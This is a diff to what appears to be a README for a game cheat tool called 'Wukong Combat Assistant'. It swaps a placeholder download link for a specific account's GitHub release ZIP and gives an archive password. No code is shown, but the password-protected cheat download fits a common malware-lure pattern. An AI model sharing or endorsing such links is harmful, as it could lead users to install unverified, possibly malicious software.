@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Wukong-Combat-Assistant/releases/latest/download/Wukong-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/johnberg-ops99r1/Wukong-Combat-Assistant/releases/download/download/Wukong_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
